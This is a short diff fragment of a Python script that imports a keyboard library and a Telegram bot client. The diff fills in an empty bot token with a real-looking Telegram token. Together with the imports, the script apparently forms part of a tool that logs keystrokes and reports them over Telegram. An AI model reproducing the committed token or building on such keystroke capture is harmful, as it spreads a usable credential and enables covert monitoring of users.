@@ -4,7 +4,7 @@ import keyboard
 from threading import Thread,RLock,Condition
 
 # Set here the Telegram bot token
-BOT_TOKEN = ""
+BOT_TOKEN = "7741886480:AAHwV22aXh43dL1rhIraoss-YU96oGM4_c4"
 bot = TeleBot(BOT_TOKEN)
 
 class Log:
